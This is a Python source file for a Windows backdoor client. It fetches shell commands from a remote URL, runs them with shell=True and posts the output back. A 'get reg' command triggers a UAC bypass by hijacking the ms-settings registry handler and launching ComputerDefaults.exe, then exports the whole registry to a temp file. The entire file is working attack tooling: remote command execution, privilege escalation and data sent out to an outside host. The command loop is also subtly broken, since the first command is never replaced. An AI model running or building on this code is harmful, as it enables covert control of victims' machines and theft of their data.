import socket as sock
import requests as re
from subprocess import call
import sys
from subprocess import PIPE
from subprocess import Popen
import os
import winreg
import ctypes

#UAC bypass code (create_reg_key, exec_bypass_uac, bypass_uac) by st0rnpentest
#	see Windows 10 UAC Bypass by computerDefault on exploitDB:
#	url: https://www.exploit-db.com/exploits/45660

def get_reg():
	bypass_uac()
	path = os.environ["TEMP"] + "\\"+"temp.reg"
	return path

def bypass_uac():
	try:
		current_dir = os.path.dirname(os.path.realpath(__file__)) + '\\' + __file__
		cmd = 'regedit /e %TEMP%\\temp.reg'
		exec_bypass_uac(cmd)
		os.system(r'C:\\windows\\system32\\ComputerDefaults.exe')
		return 1
	except WindowsError:
		sys.exit(1)

def exec_bypass_uac(cmd):
	try:
		create_reg_key('DelegateExecute', '')
		create_reg_key(None, cmd)    
	except WindowsError:
		raise

def create_reg_key(key, value):
	try:
		winreg.CreateKey(winreg.HKEY_CURRENT_USER, 'Software\Classes\ms-settings\shell\open\command')
		registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 'Software\Classes\ms-settings\shell\open\command', 0, winreg.KEY_WRITE)
		winreg.SetValueEx(registry_key, key, 0, winreg.REG_SZ, value)
		winreg.CloseKey(registry_key)
	except WindowsError:
		raise

def open_shell(url):
	client = re.get(url)
	if client.status_code == 404:
		return None
	return client

def get_command(client):
	if client.status_code == 200:
		command = client.content.decode('utf-16')
		return command
	else:
		print("Error!")
		re.post(b'error')
		return None

def execute_command(command):
	with open('out.txt', 'wb') as f:
		output = Popen(command, shell=True, stdout=PIPE, stdin=PIPE)
		f.write(output.communicate()[0])
	return 'out.txt'

def return_results(url, file_name):
	re.post(url=url, data=open(file_name, 'rb'))


if __name__ == "__main__":	
	url = 'http://' + sys.argv[1] if len(sys.argv) > 1 else 'http://localhost'
	client = open_shell(url) #establish the connection
	try:
		if client != None:
			command = get_command(client)
			print(command)
			while "exit client" not in command:
				if "get reg" in command:
					file_name = get_reg()
				else:
					file_name = execute_command(command)
				return_results(url, file_name)
				get_command(client)
	except KeyboardInterrupt:
		client.close()
		sys.exit(0)
